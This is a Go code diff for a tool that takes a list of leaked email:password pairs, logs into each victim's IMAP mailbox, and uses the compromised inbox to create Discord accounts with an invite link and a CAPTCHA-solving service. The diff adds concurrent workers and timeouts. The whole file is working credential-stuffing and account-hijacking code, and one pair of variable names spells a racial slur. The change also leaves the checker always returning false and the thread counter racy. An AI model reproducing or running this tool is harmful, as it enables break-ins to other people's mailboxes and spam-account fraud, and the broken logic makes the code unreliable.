@@ -4,11 +4,13 @@ import (
 	Modules "Discord-Tool/Modules"
 	"bufio"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"os"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/emersion/go-imap"
@@ -17,18 +19,17 @@ import (
 )
 
 var (
-	blue    = color.New(color.FgBlue).SprintFunc()
-	red     = color.New(color.FgRed).SprintFunc()
-	yellow  = color.New(color.FgYellow).SprintFunc()
-	green   = color.New(color.FgHiGreen).SprintFunc()
-	magenta = color.New(color.FgMagenta).SprintFunc()
-	bbb     = color.New(color.FgHiRed).SprintFunc()
-	cyan    = color.New(color.FgCyan).SprintFunc()
-	c       *client.Client
+	blue         = color.New(color.FgBlue).SprintFunc()
+	red          = color.New(color.FgRed).SprintFunc()
+	yellow       = color.New(color.FgYellow).SprintFunc()
+	green        = color.New(color.FgHiGreen).SprintFunc()
+	magenta      = color.New(color.FgMagenta).SprintFunc()
+	bbb          = color.New(color.FgHiRed).SprintFunc()
+	cyan         = color.New(color.FgCyan).SprintFunc()
+	threadid int = -1
 )
 
-// Sacn this shit
-func Scan(username string, passowrd string, addr string) bool {
+func checker(username string, passowrd string, addr string) (bool, *client.Client) {
 	select {
 	case <-time.After(5 * time.Second):
 		break
@@ -36,39 +37,34 @@ func Scan(username string, passowrd string, addr string) bool {
 	cone, err := client.DialTLS(addr, nil)
 	if err != nil {
 		Modules.Log(fmt.Sprintf("%s", err), "IMAP", "error")
-		return false
+		return false, nil
 	}
 
-	c = cone
-
-	// Don't forget to logout
-	// defer c.Logout()
-
 	// Login
-	if err := c.Login(username, passowrd); err != nil {
+	if err := cone.Login(username, passowrd); err != nil {
 		Modules.Log("invalid credentials or IMAP is disabled", "Auth", "bad")
-		return false
+		return false, nil
 	}
 
 	// List mailboxes
 	mailboxes := make(chan *imap.MailboxInfo, 10)
 	done := make(chan error, 1)
 	go func() {
-		done <- c.List("", "*", mailboxes)
+		done <- cone.List("", "*", mailboxes)
 	}()
 
 	if err := <-done; err != nil {
 		Modules.Log(fmt.Sprintf("%s", err), "Err", "error")
-		return false
+		return false, nil
 	}
 
 	// Select INBOX
-	mbox, err := c.Select("INBOX", false)
+	mbox, err := cone.Select("INBOX", false)
 	if err != nil {
 		Modules.Log(fmt.Sprintf("%s", err), "Err", "error")
-		return false
+		return false, nil
 	}
-	// Get the last 4 messages
+	// Get the last messages
 	from := uint32(1)
 	to := mbox.Messages
 	if mbox.Messages > 999 {
@@ -81,23 +77,30 @@ func Scan(username string, passowrd string, addr string) bool {
 	messages := make(chan *imap.Message, 10)
 	done = make(chan error, 1)
 	go func() {
-		done <- c.Fetch(seqset, []imap.FetchItem{imap.FetchEnvelope}, messages)
+		done <- cone.Fetch(seqset, []imap.FetchItem{imap.FetchEnvelope}, messages)
 	}()
 
 	for msg := range messages {
 		if strings.Contains(msg.Envelope.Subject, "Discord") {
-			return false
+			return false, nil
 		}
 	}
 
-	return true
+	return false, cone
 }
 
 func main() {
 	Modules.Logo()
-	fmt.Fprintf(color.Output, "%s%s%s %s%s (%s/%s) ", blue("["), bbb("+"), blue("]"), magenta("do you want to use default settings"), cyan("?"), green("Y"), red("n"))
+	maxNbConcurrentGoroutines := flag.Int("threads", 3, "the number of goroutines that are allowed to run concurrently")
+	pass := flag.Bool("pass", false, "start program directly")
+	timeout := flag.Duration("timeout", 30*time.Second, "Timeout of the checker")
+	flag.Parse()
+	fmt.Println(flag.Args())
 	var op string
-	fmt.Scanln(&op)
+	if *pass != true {
+		fmt.Fprintf(color.Output, "%s%s%s %s (%s/%s) ", blue("["), bbb("+"), blue("]"), color.HiCyanString("would u like to use default configs?"), green("Y"), color.HiRedString("n"))
+		fmt.Scanln(&op)
+	}
 
 	// Classes
 	var comboList string
@@ -149,37 +152,50 @@ func main() {
 
 	file, err := os.Open(comboList)
 	if err != nil {
-		log.Fatalf("Failed to open combolist")
+		log.Fatal("Failed to open combolist")
 
 	}
 	scanner := bufio.NewScanner(file)
 	scanner.Split(bufio.ScanLines)
+
+	concurrentGoroutines := make(chan struct{}, *maxNbConcurrentGoroutines)
+	var wg sync.WaitGroup
+
 	for scanner.Scan() {
-		combo := strings.Split(scanner.Text(), ":")
-		if imaphost[strings.Split(combo[0], "@")[1]] == nil {
-			continue
-		}
-		// start
-		c1 := make(chan string, 1)
-
-		// Run your long running function in it's own goroutine and pass back it's
-		// response into our channel.
-		go func() {
-			text := Scan(combo[0], combo[1], imaphost[strings.Split(combo[0], "@")[1]].(string))
-			c1 <- fmt.Sprintf("%v", text)
-		}()
-
-		// Listen on our channel AND a timeout channel - which ever happens first.
-		select {
-		case res := <-c1:
-			if res == "true" {
-				fmt.Fprintf(color.Output, "%s%s%s Logged into %s\n", magenta("["), cyan("+"), magenta("]"), combo[0])
-				Modules.Creator(c, out, names, combo, invite, config.TwoCaptcha)
-				c.Logout()
+		wg.Add(1)
+		go func(i string) {
+			defer wg.Done()
+			concurrentGoroutines <- struct{}{}
+			threadid++
+			fmt.Println(threadid)
+			combo := strings.Split(i, ":")
+			if imaphost[strings.Split(combo[0], "@")[1]] == nil {
+				<-concurrentGoroutines
+				return
 			}
-		case <-time.After(20 * time.Second):
-			Modules.Log(imaphost[strings.Split(combo[0], "@")[1]].(string)+" out of time", "Timeout", "bad")
-		}
-		//ednd
+
+			c1 := make(chan bool, 1)
+			c2 := make(chan *client.Client, 1)
+
+			go func() {
+				nig, ger := checker(combo[0], combo[1], imaphost[strings.Split(combo[0], "@")[1]].(string))
+				c1 <- nig
+				c2 <- ger
+			}()
+			// Listen on our channel AND a timeout channel - which ever happens first.
+			select {
+			case res := <-c1:
+				if res {
+					wtf := <-c2
+					fmt.Fprintf(color.Output, "%s%s%s Logged into %s\n", magenta("["), cyan("+"), magenta("]"), combo[0])
+					Modules.Creator(wtf, out, names, combo, invite, config.TwoCaptcha)
+					wtf.Logout()
+				}
+			case <-time.After(*timeout):
+				Modules.Log(imaphost[strings.Split(combo[0], "@")[1]].(string)+" out of time", "Timeout", "bad")
+			}
+			<-concurrentGoroutines
+		}(scanner.Text())
 	}
+	wg.Wait()
 }
